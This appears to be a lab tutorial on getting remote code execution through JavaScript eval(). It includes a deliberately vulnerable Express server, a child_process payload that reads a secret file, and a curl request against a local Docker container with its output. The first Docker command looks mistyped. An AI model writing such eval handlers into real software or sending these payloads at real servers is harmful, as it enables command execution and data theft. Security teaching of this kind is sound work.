# Bypassing Eval and Safe-Eval for RCE

## eval
In Javascript the *eval()* function is used to evaluate the Javascript code that is passed to it. As you can probably imagine, using the *eval()* function safely is a very hard task. This is because the whole point of *eval()* is to parse an input and execute it as code.

If one can execute code then one can pass arguments in a way that they result in execution paths that the developers didn't expect. For instance using *eval()* to return the contents of a secret file, or even to start a reverse shell. 

### Example
Start by building and running the **eval_webapp** docker container. 
```
docker run . -t sebackwards/eval-webapp
docker run -p 8001:8001 -d sebackwards/eval-webapp
```

Now, before moving forward lets analyze this app. The application contains a eval-server.js file that describes the functionality. I've also placed a secret.txt file in the working directory as a flag that we can read once we have code execution.

Here's the code of our eval-server.js application:
```
'use strict';
const express = require('express');
const PORT = 8001;
const HOST = '0.0.0.0';

// App
const app = express();
app.get('/', function(req,res){
    res.send('Hello ' + eval(req.query.q));
    console.log(req.query.q);
});

app.listen(PORT,HOST)
console.log(`Running on http://${HOST}:${PORT}`)
```

In short, we can pass the parameter *q* to application and it will feed whatever we pass to the *eval()* function. Then it will send the response back to us with a Hello message.

Because *eval()* will execute anything we pass as Javscript then we can invoke JS functions that interact with the underlying system. For instance we will observe what happens when we pass the following parameter for *q*.

Payload:
```
require('child_process').execSync('cat secret.txt')
```

The payload imports the *child_process* library onto the runtime environment and then uses the execSync function from the library to execute system commands and wait for them to finish before returning a response. In our case the system command will read the secret.txt file.

We can send this payload with curl and php encoding:
```
curl "http://localhost:8001?q=$(php -r "echo urlencode(\"require ('child_process').execSync('cat secret.txt')\");")"
```

The response from our app will contain the contents of secret.txt:
```
Hello SuperS3cr3t!%
```

Just like that we took advantage of the app exposing an *eval()* execution to open an opportunity for remote execution.
